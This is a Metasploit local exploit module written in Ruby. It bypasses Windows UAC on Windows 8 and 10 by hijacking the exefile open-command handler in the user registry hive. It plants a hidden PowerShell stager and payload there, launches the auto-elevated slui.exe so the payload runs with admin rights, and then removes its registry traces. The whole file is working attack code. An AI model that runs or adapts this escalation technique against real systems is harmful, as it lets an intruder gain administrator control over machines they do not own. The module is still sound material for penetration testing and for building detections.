##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/exe'
require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::Powershell
  include Post::Windows::Priv
  include Post::Windows::Registry
  include Post::Windows::Runas

  FODHELPER_DEL_KEY     = "HKCU\\Software\\Classes\\exefile".freeze
  FODHELPER_WRITE_KEY   = "HKCU\\Software\\Classes\\exefile\\shell\\open\\command".freeze
  EXEC_REG_DELEGATE_VAL = 'DelegateExecute'.freeze
  EXEC_REG_VAL          = ''.freeze # This maps to "(Default)"
  EXEC_REG_VAL_TYPE     = 'REG_SZ'.freeze
  FODHELPER_PATH        = "%WINDIR%\\System32\\slui.exe".freeze
  CMD_MAX_LEN           = 16383

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Windows UAC Protection Bypass (Via Slui File Handler Hijack)',
        'Description'   => %q{
          slui.exe is an auto-elevated binary that is vulnerable to file handler hijacking.

          Read access to HKCU\Software\Classes\exefile\shell\open is performed upon execution.
          Due to the registry key being accessible from user mode, an arbitrary executable file can be injected.

          This exploit is generally independent from programming language and bitness, as no DLL injection or
          privileged file copy is needed. In addition, if default system binaries suffice, file drops can be 
          avoided altogether.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'bytecode-77', # UAC bypass discovery and research
          'gushmazuko', # MSF & PowerShell module
        ],
        'Platform'      => ['win'],
        'SessionTypes'  => ['meterpreter'],
        'Targets'       => [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]
        ],
        'DefaultTarget' => 0,
        'References'    => [
          [
            'URL', 'https://github.com/bytecode-77/slui-file-handler-hijack-privilege-escalation',
            'URL', 'https://github.com/gushmazuko/WinBypass/blob/master/SluiHijackBypass.ps1'
          ]
        ],
        'DisclosureDate' => 'January 15 2018'
      )
    )
  end

  def check
    if sysinfo['OS'] =~ /Windows (8|10)/ && is_uac_enabled?
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    commspec = 'powershell'
    registry_view = REGISTRY_VIEW_NATIVE
    psh_path = "%WINDIR%\\System32\\WindowsPowershell\\v1.0\\powershell.exe"

    # Make sure we have a sane payload configuration
    if sysinfo['Architecture'] == ARCH_X64
      if session.arch == ARCH_X86
        # On x64, check arch
        commspec = '%WINDIR%\\Sysnative\\cmd.exe /c powershell'
        if target_arch.first == ARCH_X64
          # We can't use absolute path here as
          # %WINDIR%\\System32 is always converted into %WINDIR%\\SysWOW64 from a x86 session
          psh_path = "powershell.exe"
        end
      end
      if target_arch.first == ARCH_X86
        # Invoking x86, so switch to SysWOW64
        psh_path = "%WINDIR%\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe"
      end
    else
      # if we're on x86, we can't handle x64 payloads
      if target_arch.first == ARCH_X64
        fail_with(Failure::BadConfig, 'x64 Target Selected for x86 System')
      end
    end

    if !payload.arch.empty? && (payload.arch.first != target_arch.first)
      fail_with(Failure::BadConfig, 'payload and target should use the same architecture')
    end

    # Validate that we can actually do things before we bother
    # doing any more work
    check_permissions!

    case get_uac_level
    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
      fail_with(Failure::NotVulnerable,
                "UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...")
    when UAC_DEFAULT
      print_good('UAC is set to Default')
      print_good('BypassUAC can bypass this setting, continuing...')
    when UAC_NO_PROMPT
      print_warning('UAC set to DoNotPrompt - using ShellExecute "runas" method instead')
      shell_execute_exe
      return
    end

    payload_value = rand_text_alpha(8)
    psh_path = expand_path(psh_path)

    template_path = Rex::Powershell::Templates::TEMPLATE_DIR
    psh_payload = Rex::Powershell::Payload.to_win32pe_psh_net(template_path, payload.encoded)

    if psh_payload.length > CMD_MAX_LEN
      fail_with(Failure::None, "Payload size should be smaller then #{CMD_MAX_LEN} (actual size: #{psh_payload.length})")
    end

    psh_stager = "\"IEX (Get-ItemProperty -Path #{FODHELPER_WRITE_KEY.gsub('HKCU', 'HKCU:')} -Name #{payload_value}).#{payload_value}\""
    cmd = "#{psh_path} -nop -w hidden -c #{psh_stager}"

    existing = registry_getvaldata(FODHELPER_WRITE_KEY, EXEC_REG_VAL, registry_view) || ""
    exist_delegate = !registry_getvaldata(FODHELPER_WRITE_KEY, EXEC_REG_DELEGATE_VAL, registry_view).nil?

    if existing.empty?
      registry_createkey(FODHELPER_WRITE_KEY, registry_view)
    end

    print_status("Configuring payload and stager registry keys ...")
    unless exist_delegate
      registry_setvaldata(FODHELPER_WRITE_KEY, EXEC_REG_DELEGATE_VAL, '', EXEC_REG_VAL_TYPE, registry_view)
    end

    registry_setvaldata(FODHELPER_WRITE_KEY, EXEC_REG_VAL, cmd, EXEC_REG_VAL_TYPE, registry_view)
    registry_setvaldata(FODHELPER_WRITE_KEY, payload_value, psh_payload, EXEC_REG_VAL_TYPE, registry_view)

    # Calling slui.exe through cmd.exe allow us to launch it from either x86 or x64 session arch.
    cmd_path = expand_path(commspec)
    cmd_args = expand_path("Start-Process #{FODHELPER_PATH} -Verb runas")
    print_status("Executing payload: #{cmd_path} #{cmd_args}")

    # We can't use cmd_exec here because it blocks, waiting for a result.
    client.sys.process.execute(cmd_path, cmd_args, { 'Hidden' => true })

    # Wait a copule of seconds to give the payload a chance to fire before cleaning up
    # TODO: fix this up to use something smarter than a timeout?
    Rex::sleep(3)

    handler(client)

    print_status("Cleaining up registry keys ...")
    unless exist_delegate
      registry_deleteval(FODHELPER_WRITE_KEY, EXEC_REG_DELEGATE_VAL, registry_view)
    end
    if existing.empty?
      registry_deletekey(FODHELPER_DEL_KEY, registry_view)
    else
      registry_setvaldata(FODHELPER_WRITE_KEY, EXEC_REG_VAL, existing, EXEC_REG_VAL_TYPE, registry_view)
    end
    registry_deleteval(FODHELPER_WRITE_KEY, payload_value, registry_view)
  end

  def check_permissions!
    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?

    # Check if you are an admin
    vprint_status('Checking admin status...')
    admin_group = is_in_admin_group?

    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    end

    unless is_in_admin_group?
      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
    end

    print_status('UAC is Enabled, checking level...')
    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')
    end
  end
end
